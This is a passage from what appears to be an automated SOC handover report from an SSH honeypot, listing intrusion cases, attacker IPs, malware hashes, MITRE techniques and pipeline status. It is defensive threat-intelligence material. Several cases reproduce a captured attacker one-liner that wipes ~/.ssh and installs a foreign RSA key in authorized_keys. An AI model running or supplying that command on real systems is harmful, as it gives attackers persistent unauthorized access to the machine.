| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:31:52` | `cowrie.session.connect` |
| `2026-06-06 16:31:52` | `cowrie.client.version` |
| `2026-06-06 16:31:52` | `cowrie.client.kex` |
| `2026-06-06 16:31:53` | `cowrie.login.success` |
| `2026-06-06 16:31:54` | `cowrie.session.params` |
| `2026-06-06 16:31:54` | `cowrie.command.input` |
| `2026-06-06 16:31:54` | `cowrie.command.failed` |
| `2026-06-06 16:31:54` | `cowrie.log.closed` |
| `2026-06-06 16:31:54` | `cowrie.session.params` |
| `2026-06-06 16:31:54` | `cowrie.command.input` |
| `2026-06-06 16:31:55` | `cowrie.session.file_download` |
| `2026-06-06 16:31:55` | `cowrie.log.closed` |
| `2026-06-06 16:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c5a4b7c5ec

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:31 |
| **Last Seen** | 2026-06-06 16:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:31:58` | `cowrie.session.connect` |
| `2026-06-06 16:31:58` | `cowrie.client.version` |
| `2026-06-06 16:31:58` | `cowrie.client.kex` |
| `2026-06-06 16:31:59` | `cowrie.login.success` |
| `2026-06-06 16:31:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec0a744c64d9

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:40 |
| **Last Seen** | 2026-06-06 16:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:40:40` | `cowrie.session.connect` |
| `2026-06-06 16:40:40` | `cowrie.client.version` |
| `2026-06-06 16:40:40` | `cowrie.client.kex` |
| `2026-06-06 16:40:42` | `cowrie.login.success` |
| `2026-06-06 16:40:42` | `cowrie.session.params` |
| `2026-06-06 16:40:42` | `cowrie.command.input` |
| `2026-06-06 16:40:42` | `cowrie.command.failed` |
| `2026-06-06 16:40:43` | `cowrie.log.closed` |
| `2026-06-06 16:40:43` | `cowrie.session.params` |
| `2026-06-06 16:40:43` | `cowrie.command.input` |
| `2026-06-06 16:40:43` | `cowrie.session.file_download` |
| `2026-06-06 16:40:43` | `cowrie.log.closed` |
| `2026-06-06 16:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f6cbf651228

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:40 |
| **Last Seen** | 2026-06-06 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:40:46` | `cowrie.session.connect` |
| `2026-06-06 16:40:46` | `cowrie.client.version` |
| `2026-06-06 16:40:47` | `cowrie.client.kex` |
| `2026-06-06 16:40:48` | `cowrie.login.success` |
| `2026-06-06 16:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a85bba92ba00

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:48 |
| **Last Seen** | 2026-06-06 16:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:48:38` | `cowrie.session.connect` |
| `2026-06-06 16:48:38` | `cowrie.client.version` |
| `2026-06-06 16:48:38` | `cowrie.client.kex` |
| `2026-06-06 16:48:40` | `cowrie.login.success` |
| `2026-06-06 16:48:40` | `cowrie.session.params` |
| `2026-06-06 16:48:40` | `cowrie.command.input` |
| `2026-06-06 16:48:40` | `cowrie.command.failed` |
| `2026-06-06 16:48:41` | `cowrie.log.closed` |
| `2026-06-06 16:48:41` | `cowrie.session.params` |
| `2026-06-06 16:48:41` | `cowrie.command.input` |
| `2026-06-06 16:48:41` | `cowrie.session.file_download` |
| `2026-06-06 16:48:41` | `cowrie.log.closed` |
| `2026-06-06 16:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c4494880c8

| Field | Detail |
|---|---|
| **Source IP** | `70.120.203[.]193` |
| **First Seen** | 2026-06-06 16:48 |
| **Last Seen** | 2026-06-06 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 16:48:44` | `cowrie.session.connect` |
| `2026-06-06 16:48:44` | `cowrie.client.version` |
| `2026-06-06 16:48:44` | `cowrie.client.kex` |
| `2026-06-06 16:48:45` | `cowrie.login.success` |
| `2026-06-06 16:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.120.203[.]193` to AbuseIPDB if not already reported
- [ ] Block `70.120.203[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664c667e6f6b

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]142` |
| **First Seen** | 2026-06-06 17:01 |
| **Last Seen** | 2026-06-06 17:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 17:01:33` | `cowrie.session.connect` |
| `2026-06-06 17:01:33` | `cowrie.client.version` |
| `2026-06-06 17:01:33` | `cowrie.client.kex` |
| `2026-06-06 17:01:34` | `cowrie.login.success` |
| `2026-06-06 17:01:35` | `cowrie.session.params` |
| `2026-06-06 17:01:35` | `cowrie.command.input` |
| `2026-06-06 17:01:35` | `cowrie.command.failed` |
| `2026-06-06 17:01:35` | `cowrie.log.closed` |
| `2026-06-06 17:01:36` | `cowrie.session.params` |
| `2026-06-06 17:01:36` | `cowrie.command.input` |
| `2026-06-06 17:01:36` | `cowrie.session.file_download` |
| `2026-06-06 17:01:36` | `cowrie.log.closed` |
| `2026-06-06 17:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]142` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-049ca739adcb

| Field | Detail |
|---|---|
| **Source IP** | `62.132.18[.]142` |
| **First Seen** | 2026-06-06 17:01 |
| **Last Seen** | 2026-06-06 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 17:01:39` | `cowrie.session.connect` |
| `2026-06-06 17:01:39` | `cowrie.client.version` |
| `2026-06-06 17:01:40` | `cowrie.client.kex` |
| `2026-06-06 17:01:41` | `cowrie.login.success` |
| `2026-06-06 17:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.132.18[.]142` to AbuseIPDB if not already reported
- [ ] Block `62.132.18[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.61.123[.]132` | **30** | 2026-06-06 15:22 | 2026-06-06 16:24 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `70.120.203[.]193` | **30** | 2026-06-06 15:48 | 2026-06-06 16:54 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.114[.]231` | **29** | 2026-06-06 16:10 | 2026-06-06 16:38 | 52m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `52.169.217[.]131` | **29** | 2026-06-06 15:20 | 2026-06-06 16:21 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `47.42.131[.]93` | **20** | 2026-06-06 16:26 | 2026-06-06 17:10 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.53.22[.]186` | **2** | 2026-06-06 17:00 | 2026-06-06 17:06 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `20.64.104[.]184` | **2** | 2026-06-06 16:00 | 2026-06-06 16:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.225.192[.]15` | 1 | 2026-06-06 15:59 | 2026-06-06 16:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.111[.]33` | 1 | 2026-06-06 17:16 | 2026-06-06 17:17 | 48s | 0 | `T1592` | 🟢 LOW |
| `147.45.48[.]17` | 1 | 2026-06-06 16:02 | 2026-06-06 16:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.187[.]177` | 1 | 2026-06-06 15:49 | 2026-06-06 15:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.99.119[.]225` | 1 | 2026-06-06 16:38 | 2026-06-06 16:39 | 42s | 0 | `T1592` | 🟢 LOW |
| `193.176.29[.]18` | 1 | 2026-06-06 15:33 | 2026-06-06 15:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.93.15[.]230` | 1 | 2026-06-06 16:52 | 2026-06-06 16:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `36.140.29[.]110` | 1 | 2026-06-06 15:21 | 2026-06-06 15:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `52.161.180[.]145` | 1 | 2026-06-06 17:18 | 2026-06-06 17:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.36.75[.]227` | 1 | 2026-06-06 15:38 | 2026-06-06 15:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.132.18[.]142` | 1 | 2026-06-06 17:01 | 2026-06-06 17:01 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.195[.]110` | 1 | 2026-06-06 15:40 | 2026-06-06 15:40 | 15s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]73` | 1 | 2026-06-06 16:01 | 2026-06-06 16:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.58.201[.]183` | 1 | 2026-06-06 15:20 | 2026-06-06 15:21 | 60s | 1 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `167.99.119[.]225` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `87.58.201[.]183` | NL | QWINS Hosting | **100** ⚠️ | 0 |
| `66.132.195[.]110` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `47.42.131[.]93` | US | Charter Communications LLC | **100** ⚠️ | 4 |
| `152.32.187[.]177` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 25 |
| `218.93.15[.]230` | CN | CHINANET BACKBONE | **100** ⚠️ | 50 |
| `193.176.29[.]18` | GB | Infrawatch Limited | **100** ⚠️ | 12 |
| `14.103.114[.]231` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `85.217.149[.]73` | CA | NL MODAT | **100** ⚠️ | 50 |
| `36.140.29[.]110` | CN | China Mobile Communications Corporation | **100** ⚠️ | 19 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 217 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 118 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 67 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 34 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 25 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 249 cases |
| Tool 34  | Credential Extractor        | ✅ 185 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (10.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 67 priority case(s) shown individually · 21 recon entry/entries in table (7 group(s) consolidating 142 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-06T17:19:30Z_
